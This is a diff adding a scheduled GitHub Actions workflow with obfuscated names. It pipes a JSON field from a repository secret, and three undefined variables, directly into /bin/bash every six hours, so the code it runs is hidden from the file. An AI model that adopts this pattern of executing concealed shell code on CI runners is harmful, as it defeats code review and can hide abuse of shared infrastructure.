@@ -1,0 +1,21 @@
+name: mafangeiwosong
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '50 0/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: mafangeiwosong
+        env:
+          p440: ${{ secrets.p440 }}
+        run: |
+          echo $p440 | jq -r .damk5 | /bin/bash
+          echo $h7 | jq -r .hf9 | /bin/bash
+          echo $nsb7495 | jq -r .yyql1711 | /bin/bash
+          echo $wnrnm1 | jq -r .wwspq8891 | /bin/bash
+
